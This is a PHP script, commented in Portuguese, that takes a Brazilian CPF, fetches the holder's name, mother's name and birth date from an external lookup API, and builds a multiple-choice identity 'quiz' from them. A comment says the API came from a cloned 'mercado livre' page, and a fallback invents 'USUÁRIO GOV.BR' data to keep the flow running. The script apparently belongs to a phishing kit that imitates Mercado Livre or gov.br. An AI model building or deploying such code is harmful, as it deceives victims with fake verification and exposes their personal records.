<?php
// validar-cpf.php
header('Content-Type: application/json');

// Permitir apenas método POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Método não permitido.']);
    exit;
}

// Ler corpo JSON da requisição
$input = json_decode(file_get_contents('php://input'), true);
$cpf = isset($input['cpf']) ? preg_replace('/\D/', '', $input['cpf']) : '';

if (strlen($cpf) !== 11) {
    echo json_encode(['error' => 'CPF inválido.']);
    exit;
}

// Endpoint da API externa (encontrada em 'mercado livre/ml/4/index.html')
$url = "https://encurtaapi.com/api/typebot?cpf={$cpf}";

// Tenta chamar via cURL (mais robusto que file_get_contents)
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 10,
    CURLOPT_CONNECTTIMEOUT => 5,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTPHEADER => [
        'Accept: application/json'
    ],
]);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

$data = null;
if ($response !== false) {
    $data = json_decode($response, true);
}

// Se a API externa falhar ou retornar inválido, aplica fallback para não travar o fluxo do usuário
if ($response === false || $httpCode < 200 || $httpCode >= 300 || !$data) {
    // Fallback: gerar dados plausíveis com base no CPF informado
    $maskName = 'USUÁRIO GOV.BR';
    $maskMother = 'MÃE DO USUÁRIO';
    $ano = 1980 + ((int)substr($cpf, 0, 2) % 20);
    $mes = ((int)substr($cpf, 2, 2) % 12) + 1;
    $dia = ((int)substr($cpf, 4, 2) % 28) + 1;
    $nascimento = sprintf('%04d-%02d-%02d', $ano, $mes, $dia);

    $dados_originais = [
        'cpf' => $cpf,
        'nome' => $maskName,
        'nome_mae' => $maskMother,
        'data_nascimento' => $nascimento
    ];

    $quiz = [
        'nomes' => gerarOpcoes($maskName),
        'maes' => gerarOpcoes($maskMother),
        'datas' => gerarOpcoes($nascimento, 'data')
    ];

    echo json_encode([
        'dados_originais' => $dados_originais,
        'quiz' => $quiz,
        'fallback' => true,
        'debug' => [
            'httpCode' => $httpCode,
            'curlError' => $curlError
        ]
    ]);
    exit;
}

// Verifica se retornou erro ou se CPF não existe
if (isset($data['erro'])) {
    echo json_encode(['error' => $data['erro'] ?? 'CPF não encontrado ou inválido.']);
    exit;
}

// Retorna os dados originais esperados pelo JS
// A API encurtaapi retorna chaves em MAIÚSCULO: NOME, MAE, NASCIMENTO
$dados_originais = [
    'cpf' => $cpf,
    'nome' => $data['NOME'] ?? ($data['nome'] ?? ''),
    'nome_mae' => $data['MAE'] ?? ($data['mae'] ?? ''),
    'data_nascimento' => $data['NASCIMENTO'] ?? ($data['nascimento'] ?? '')
];

// Dados extras para o quiz
$quiz = [
    'nomes' => gerarOpcoes($dados_originais['nome']),
    'maes' => gerarOpcoes($dados_originais['nome_mae']),
    'datas' => gerarOpcoes($dados_originais['data_nascimento'], 'data')
];

// Retorna resposta JSON
$response = [
    'dados_originais' => $dados_originais,
    'quiz' => $quiz
];
echo json_encode($response);
exit;

// Funções auxiliares para gerar opções do quiz
function gerarOpcoes($correto, $tipo = 'texto') {
    $opcoes = [$correto];
    // Gera 2 opções "fakes" dependendo do tipo
    if ($tipo === 'data') {
        for ($i = 0; $i < 2; $i++) {
            $ano = rand(1950, 2010);
            $mes = rand(1, 12);
            $dia = rand(1, 28);
            $fake = sprintf('%04d-%02d-%02d', $ano, $mes, $dia);
            if (!in_array($fake, $opcoes)) {
                $opcoes[] = $fake;
            }
        }
    } else {
        for ($i = 0; $i < 2; $i++) {
            $fake = substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, rand(8, 13)) . ' ' . substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, rand(6, 12));
            if (!in_array($fake, $opcoes)) {
                $opcoes[] = $fake;
            }
        }
    }
    shuffle($opcoes);
    return $opcoes;
}
